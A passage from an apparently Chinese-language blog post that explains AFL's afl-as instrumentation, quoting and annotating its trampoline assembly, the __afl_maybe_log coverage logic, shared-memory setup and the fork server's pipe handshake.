the</span></span><br><span class="line"><span class="comment">       branch destination label (handled later on). */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插桩：基本块</span></span><br><span class="line">    <span class="comment">// jump类指令</span></span><br><span class="line">    <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">1</span>] == <span class="string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="number">2</span>] != <span class="string">&#x27;m&#x27;</span> &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class="line">                <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"></span><br><span class="line">        ins_lines++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class="line"><span class="comment">       tread carefully and account for several different formatting</span></span><br><span class="line"><span class="comment">       conventions. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暂时忽略对苹果的处理</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((colon_pos = <span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;L&#x27;</span> &amp;&amp; <span class="built_in">isdigit</span>(*(colon_pos - <span class="number">1</span>))) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;:&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">1</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">isdigit</span>(line[<span class="number">2</span>]) || (clang_mode &amp;&amp; !<span class="built_in">strncmp</span>(line + <span class="number">1</span>, <span class="string">&quot;LBB&quot;</span>, <span class="number">3</span>)))</span><br><span class="line">            &amp;&amp; <span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* An optimization is possible here by adding the code only if the</span></span><br><span class="line"><span class="comment">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class="line"><span class="comment">             That said, this complicates the code by requiring two-pass</span></span><br><span class="line"><span class="comment">             processing (messy with stdin), and results in a speed gain</span></span><br><span class="line"><span class="comment">             typically under 10%, because compilers are generally pretty good</span></span><br><span class="line"><span class="comment">             about not generating spurious intra-function jumps.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We use deferred output chiefly to avoid disrupting</span></span><br><span class="line"><span class="comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class="line"><span class="comment">             MacOS X). */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!skip_next_label) instrument_next = <span class="number">1</span>; <span class="keyword">else</span> skip_next_label = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Function label (always instrumented, deferred mode). */</span></span><br><span class="line"></span><br><span class="line">        instrument_next = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ins_lines)</span><br><span class="line">    <span class="built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_file) <span class="built_in">fclose</span>(inf);</span><br><span class="line">  <span class="built_in">fclose</span>(outf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!be_quiet) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ins_lines) <span class="built_in">WARNF</span>(<span class="string">&quot;No instrumentation targets found%s.&quot;</span>,</span><br><span class="line">                          pass_thru ? <span class="string">&quot; (pass-thru mode)&quot;</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,</span><br><span class="line">             ins_lines, use_64bit ? <span class="string">&quot;64&quot;</span> : <span class="string">&quot;32&quot;</span>,</span><br><span class="line">             <span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>) ? <span class="string">&quot;hardened&quot;</span> : </span><br><span class="line">             (sanitizer ? <span class="string">&quot;ASAN/MSAN&quot;</span> : <span class="string">&quot;non-hardened&quot;</span>),</span><br><span class="line">             inst_ratio);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要存在两种插桩：在每一个基本块入口，afl-as 插入了一段代码。除此之外，在整个程序的末尾，插入了一段 300 多行的 <code>AFL main payload</code></p>
<ul>
<li>基本块：在ida graph可以看到分块，这里的判断就是函数执行的开头以及每一个 <code>j</code> 指令但是 第二个不是 <code>m</code></li>
<li>jump 指令，也就是编译器的每个 <code>label</code> 开头插入一些</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">检查函数名或者条件跳转标签, 判断是否正确插桩. 我们希望捕获下列情况, (^表示行开头)</span><br><span class="line">    <span class="number">1.</span> ^main        - 函数入口点</span><br><span class="line">    <span class="number">2.</span> ^.L0         - GCC跳转标签</span><br><span class="line">    <span class="number">3.</span> ^.LBB0_0     - clang跳转标签</span><br><span class="line">    <span class="number">4.</span> ^\tjnz foo   - 条件跳转标签</span><br><span class="line">    ...</span><br><span class="line">但不希望捕获下列标签</span><br><span class="line">    <span class="number">1.</span> ^# BB#<span class="number">0</span>      - clang注释</span><br><span class="line">    <span class="number">2.</span> ^ # BB#<span class="number">0</span>     - clang注释</span><br><span class="line">    <span class="number">3.</span> ^.Ltmp0      - clang非分支标签</span><br><span class="line">    <span class="number">4.</span> ^.LC0        - GCC非分支标签</span><br><span class="line">    <span class="number">5.</span> ^.LBB0_0     - GCC非分支标签</span><br><span class="line">    <span class="number">6.</span> ^\tjmp foo   - 非条件跳转</span><br></pre></td></tr></table></figure>

<h2 id="trampoline"><a href="#trampoline" class="headerlink" title="trampoline"></a>trampoline</h2><p>基本块入口，跳板</p>
<ul>
<li>将 rsp 下降一段距离</li>
<li>将 rdx, rcx, rax 的值存放到栈上</li>
<li>将 rcx 设为一个立即数（由 afl-as 随机生成）</li>
<li>调用 __afl_maybe_log</li>
<li>恢复 rdx, rcx, rax 和 rsp</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="built_in">R</span>(MAP_SIZE));</span><br><span class="line"><span class="comment">// fprtinf</span></span><br><span class="line"><span class="comment">// 其中R(MAP_SIZE))是ecx/rcx要设置的值 %08x。</span></span><br><span class="line"><span class="comment">// MAP_SIZE定义为64K，R(x)定义为(random() % (x)) ，故R(MAP_SIZE))为0~64K的一个随机数。</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span>   </span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="main-payload"><a href="#main-payload" class="headerlink" title="main_payload"></a>main_payload</h2><p>程序末尾插入<code>main_payload</code></p>
<p>比较长，推荐在IDA等工具里看一下CFG</p>
<h3 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log"></a>__afl_maybe_log</h3><p>afl_maybe_log</p>
<ul>
<li>lahf：load ah with flags，将eflags寄存器的值加载到ah</li>
<li>seto %al记录此时OF(溢出标志)的状态，当标志寄存器中的此标志位置位时，将AL寄存器置位</li>
<li>从注释可以看出来：__afl_maybe_log 先检查共享内存区域是否已经映射。<ul>
<li>如果还未映射，则跳转到 __afl_setup 进行初始化；</li>
<li>否则继续执行 __afl_store 逻辑，rdx 寄存器指向共享内存区块。</li>
</ul>
</li>
</ul>
<p>首先会判断<code>__afl_area_ptr</code> 是否初始化，否则就会进入<code>afl_setup</code> 假设已经初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_maybe_log:</span><br><span class="line"></span><br><span class="line">  lahf</span><br><span class="line">  seto  %al</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check if SHM region is already mapped. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_area_ptr(%rip), %rdx</span><br><span class="line">  testq %rdx, %rdx</span><br><span class="line">  je    __afl_setup</span><br><span class="line"></span><br><span class="line">__afl_store:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate and store hit for the code location specified in rcx. */</span></span><br><span class="line">  xorq __afl_prev_loc(%rip), %rcx</span><br><span class="line">  xorq %rcx, __afl_prev_loc(%rip)</span><br><span class="line">  shrq $<span class="number">1</span>, __afl_prev_loc(%rip)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">incb</span> (%rdx, %rcx, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">__afl_return:</span><br><span class="line"></span><br><span class="line">  addb $<span class="number">127</span>, %al</span><br><span class="line">  sahf</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>

<p><code>__afl_maybe_log</code> 先检查共享内存区域是否已经映射。如果还未映射，则跳转到 __afl_setup 进行初始化；否则继续执行 __afl_store 逻辑，rdx 寄存器指向共享内存区块。</p>
<p><code>__afl_store</code> 执行过程为：</p>
<ul>
<li>将目前存储着 cur_location 的 rcx 寄存器异或上 prev_loc</li>
<li>将 prev_loc 设为 cur_loc （这里利用了异或运算的自反性）</li>
<li>将 prev_loc 右移一位</li>
<li>增加 hit count</li>
</ul>
<p>非常巧妙的代码覆盖率测量：Coverage measurements <a href="https://xidoo.top/2022/01/afl-white-book/">(1)</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>这些过程执行完后，恢复 eflags 并返回。现在，我们弄清了插入到基本块起始处的桩代码的逻辑。</p>
<h3 id="afl-setup"><a href="#afl-setup" class="headerlink" title="__afl_setup"></a>__afl_setup</h3><p>没有创建共享内存，会跳转到这里创建一块共享内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_setup:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do not retry setup if we had previous failures. */</span></span><br><span class="line"></span><br><span class="line">  cmpb $<span class="number">0</span>, __afl_setup_failure(%rip)</span><br><span class="line">  jne __afl_return</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check out if we have a global pointer on file. */</span></span><br><span class="line"></span><br><span class="line">  movq  __afl_global_area_ptr@<span class="built_in">GOTPCREL</span>(%rip), %<span class="function">rdx</span></span><br><span class="line"><span class="function">  <span class="title">movq</span>  <span class="params">(%rdx)</span>, %rdx</span></span><br><span class="line"><span class="function">  <span class="comment">/* 判断是否是0 也就是没有创建*/</span></span></span><br><span class="line"><span class="function">  testq %rdx, %rdx</span></span><br><span class="line"><span class="function">  je    __afl_setup_first</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rdx, __<span class="title">afl_area_ptr</span><span class="params">(%rip)</span></span></span><br><span class="line"><span class="function">  jmp  __afl_store</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 它首先把一些 caller-save 寄存器保存在栈上（这是为了方便后续在 fork server 中恢复原有寄存器状态）。*/</span></span></span><br><span class="line"><span class="function">__afl_setup_first:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Save everything that is not yet saved and that may be touched by</span></span><br><span class="line"><span class="function">     getenv() and several other libcalls we<span class="string">&#x27;ll be relying on. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* 首先保存所有的寄存器 */</span></span></span><br><span class="line"><span class="string"><span class="function">  leaq -352(%rsp), %rsp</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rax,   0(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rcx,   8(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rdi,  16(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %rsi,  32(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r8,   40(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r9,   48(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r10,  56(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %r11,  64(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm0,  96(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm1,  112(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm2,  128(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm3,  144(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm4,  160(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm5,  176(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm6,  192(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm7,  208(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm8,  224(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm9,  240(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm10, 256(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm11, 272(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm12, 288(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm13, 304(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm14, 320(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function">  movq %xmm15, 336(%rsp)</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */</span></span></span><br><span class="line"><span class="string"><span class="function"></span></span></span><br><span class="line"><span class="string"><span class="function">  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;</span>ll keep the</span></span><br><span class="line"><span class="function">     original stack ptr in the callee-saved r12. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  pushq %r12</span></span><br><span class="line"><span class="function">  movq  %rsp, %r12</span></span><br><span class="line"><span class="function">  subq  $<span class="number">16</span>, %rsp</span></span><br><span class="line"><span class="function">  andq  $<span class="number">0xfffffffffffffff0</span>, %rsp</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  leaq .AFL_SHM_ENV(%rip), %rdi</span></span><br><span class="line"><span class="function">call getenv@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  testq %rax, %rax</span></span><br><span class="line"><span class="function">  je    __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq  %rax, %rdi</span></span><br><span class="line"><span class="function">call atoi@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  xorq %rdx, %rdx   /* shmat flags    */</span></span><br><span class="line"><span class="function">  xorq %rsi, %rsi   /* requested addr */</span></span><br><span class="line"><span class="function">  movq %rax, %rdi   /* SHM ID: 这个ID是由环境变量指定的         */</span></span><br><span class="line"><span class="function">call shmat@PLT</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  cmpq $<span class="number">-1</span>, %rax</span></span><br><span class="line"><span class="function">  je   __afl_setup_abort</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  /* Store the address of the SHM region. */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br><span class="line"><span class="function">  movq %rax, __afl_area_ptr(%rip)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx</span></span><br><span class="line"><span class="function">  movq %rax, (%rdx)</span></span><br><span class="line"><span class="function">  movq %rax, %rdx</span></span><br></pre></td></tr></table></figure>

<p>调用 getenv(“__AFL_SHM_ID”)，如果返回 0 则进入 __afl_setup_abort 错误处理流程，否则往下继续执行。我们先去看错误处理流程</p>
<ul>
<li>就是把 __afl_setup_failure 变量自增，还原所有寄存器并返回。</li>
<li>如果环境变量 __AFL_SHM_ID 不存在，则共享内存的初始化会失败</li>
<li>但整个桩代码对于目标程序是透明的——无非是保存了一些寄存器、执行了一些无副作用的代码、最后恢复寄存器——因此目标程序可以正常执行。</li>
<li>这片虚拟内存是什么时候创建的？答案是 afl-fuzz 在 setup_shm() 流程中调用 shmget() 创建了虚拟内存，并将 shm id 写入 __AFL_SHM_ID 环境变量。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_setup_abort:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Record setup failure so that we don&#x27;t keep calling</span></span><br><span class="line"><span class="comment">     shmget() / shmat() over and over again. */</span></span><br><span class="line"></span><br><span class="line">  incb __afl_setup_failure(%rip)</span><br><span class="line"></span><br><span class="line">  movq %r12, %rsp</span><br><span class="line">  popq %r12</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">0</span>(%rsp), %rax</span><br><span class="line">  movq  <span class="number">8</span>(%rsp), %rcx</span><br><span class="line">  movq <span class="number">16</span>(%rsp), %rdi</span><br><span class="line">  movq <span class="number">32</span>(%rsp), %rsi</span><br><span class="line">  movq <span class="number">40</span>(%rsp), %r8</span><br><span class="line">  movq <span class="number">48</span>(%rsp), %r9</span><br><span class="line">  movq <span class="number">56</span>(%rsp), %r10</span><br><span class="line">  movq <span class="number">64</span>(%rsp), %r11</span><br><span class="line"></span><br><span class="line">  movq  <span class="number">96</span>(%rsp), %xmm0</span><br><span class="line">  movq <span class="number">112</span>(%rsp), %xmm1</span><br><span class="line">  movq <span class="number">128</span>(%rsp), %xmm2</span><br><span class="line">  movq <span class="number">144</span>(%rsp), %xmm3</span><br><span class="line">  movq <span class="number">160</span>(%rsp), %xmm4</span><br><span class="line">  movq <span class="number">176</span>(%rsp), %xmm5</span><br><span class="line">  movq <span class="number">192</span>(%rsp), %xmm6</span><br><span class="line">  movq <span class="number">208</span>(%rsp), %xmm7</span><br><span class="line">  movq <span class="number">224</span>(%rsp), %xmm8</span><br><span class="line">  movq <span class="number">240</span>(%rsp), %xmm9</span><br><span class="line">  movq <span class="number">256</span>(%rsp), %xmm10</span><br><span class="line">  movq <span class="number">272</span>(%rsp), %xmm11</span><br><span class="line">  movq <span class="number">288</span>(%rsp), %xmm12</span><br><span class="line">  movq <span class="number">304</span>(%rsp), %xmm13</span><br><span class="line">  movq <span class="number">320</span>(%rsp), %xmm14</span><br><span class="line">  movq <span class="number">336</span>(%rsp), %xmm15</span><br><span class="line"></span><br><span class="line">  leaq <span class="number">352</span>(%rsp), %rsp</span><br><span class="line"></span><br><span class="line">  jmp __afl_return</span><br></pre></td></tr></table></figure>

<p>如果存在环境变量，就会调用 <code>shmat(shmid, 0, 0)</code>,将共享内存区域的地址存进 __afl_area_ptr，并写进 GOT 表中的 __afl_global_area_ptr 条目。</p>
<ul>
<li><code>__afl_area_ptr</code> 是一个 lcomm，而 <code>__afl_global_area_ptr</code> 是一个 comm 。</li>
<li>lcomm 有点类似于全局 static 变量，不同文件中的重名 lcomm 是指向不同的地址；但 comm 有点类似于全局变量，不同文件中的重名 comm 指向同一个地址</li>
<li>假如目标程序是多份代码链接形成的，那么，每份汇编文件都拥有 AFL main payload；对于编译出的每个代码片段，都会有自己对应的 __afl_area_ptr 。</li>
<li>但 __afl_global_area_ptr 只有一份，只需要优先参考 __afl_global_area_ptr ，就能让所有桩代码访问的 shm 保持一致。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.AFL_VARS:</span><br><span class="line"></span><br><span class="line">  .lcomm   __afl_area_ptr, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_prev_loc, <span class="number">8</span></span><br><span class="line">  .lcomm   __afl_fork_pid, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_temp, <span class="number">4</span></span><br><span class="line">  .lcomm   __afl_setup_failure, <span class="number">1</span></span><br><span class="line">  .comm    __afl_global_area_ptr, <span class="number">8</span>, <span class="number">8</span></span><br><span class="line"></span><br><span class="line">.AFL_SHM_ENV:</span><br><span class="line">  .asciz <span class="string">&quot;__AFL_SHM_ID&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后，用 <code>rdx</code> 寄存器存放共享内存地址，进入 fork server。</p>
<h4 id="fork-server"><a href="#fork-server" class="headerlink" title="fork server"></a>fork server</h4><p>execve() 的效率比较低。fuzzer 需要高频率地执行目标程序，显然不宜在 execve() 上浪费过多时间。</p>
<p>AFL 的解决方案是使用 fork server：</p>
<p>让程序在第一个基本块处停下，等待 fuzzer 发送指令；收到指令后继续执行程序；</p>
<p>执行完毕后，恢复 fork 时的状态。AFL高效的实现这一需求。</p>
<ul>
<li>把 shm 地址连续压栈两次（以保证 esp 仍然是 16 的倍数），然后调用 <code>write(FORKSRV_FD+1, __afl_temp, 4)</code>。<ul>
<li>config.h 中的 FORKSRV_FD 常量，fork server 使用 198、199 这两个 fd 传递指令。</li>
<li>__afl_temp 是 bss 段的长度 4 字节的变量。</li>
<li>使用pipe在进程间通信，这个pipe在afl-fuzz时进行创建</li>
</ul>
</li>
<li>如果这四个字节写入失败（write() 的返回不等于 4），则直接进入 __afl_fork_resume 逻辑；否则，进入 __afl_fork_wait_loop 逻辑。</li>
</ul>
<p><a href="https://rk700.github.io/2017/12/28/afl-internals/">afl-fuzz初始化pipe</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// st_pipe: status pipe</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>进入forkserver</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_forkserver:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Enter the fork server mode to avoid the overhead of execve() calls. We</span></span><br><span class="line"><span class="comment">     push rdx (area ptr) twice to keep stack alignment neat. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* %rdx 内保存 shm 地址 */</span></span><br><span class="line">  pushq %rdx</span><br><span class="line">  pushq %rdx</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Phone home and tell the parent that we&#x27;re OK. (Note that signals with</span></span><br><span class="line"><span class="comment">     no SA_RESTART will mess it up). If this fails, assume that the fd is</span></span><br><span class="line"><span class="comment">     closed because we were execve()d from an instrumented binary, or because</span></span><br><span class="line"><span class="comment">     the parent doesn&#x27;t want to use the fork server. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 往st_pipe里写入数据，表示forkserver启动成功，通知fuzzer</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;</span>, %rdi       <span class="comment">/* file desc */</span></span><br><span class="line">call write@PLT</span><br><span class="line"></span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_fork_resume</span><br><span class="line"></span><br><span class="line">__afl_fork_wait_loop:</span><br></pre></td></tr></table></figure>

<p>写入成功，会进入 <code>__afl_fork_wait_loop</code></p>
<ul>
<li>read读取<code>ctl_pipe</code>，如果没成功进入<code>__afl_die</code></li>
<li>成功了，调用fork</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__afl_fork_wait_loop:</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for parent by reading from the pipe. Abort if read fails. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// read ctl_pipe 数据，从fuzzer读取</span></span><br><span class="line">  movq $<span class="number">4</span>, %rdx               <span class="comment">/* length    */</span></span><br><span class="line">  leaq __afl_temp(%rip), %rsi <span class="comment">/* data      */</span></span><br><span class="line">  movq $<span class="string">&quot; STRINGIFY(FORKSRV_FD) &quot;</span>, %rdi             <span class="comment">/* file desc */</span></span><br><span class="line">call read@PLT</span><br><span class="line">  cmpq $<span class="number">4</span>, %rax</span><br><span class="line">  jne  __afl_die</span><br><span class="line">call fork@PLT</span><br><span class="line">  cmpq $<span class="number">0</span>, %rax</span><br><span class="line">  jl   __afl_die</span><br><span class="line">  je   __afl_fork_resume</span><br></pre></td></tr></table></figure>

<p>对于父进程，则继续执行以下逻辑：</p>
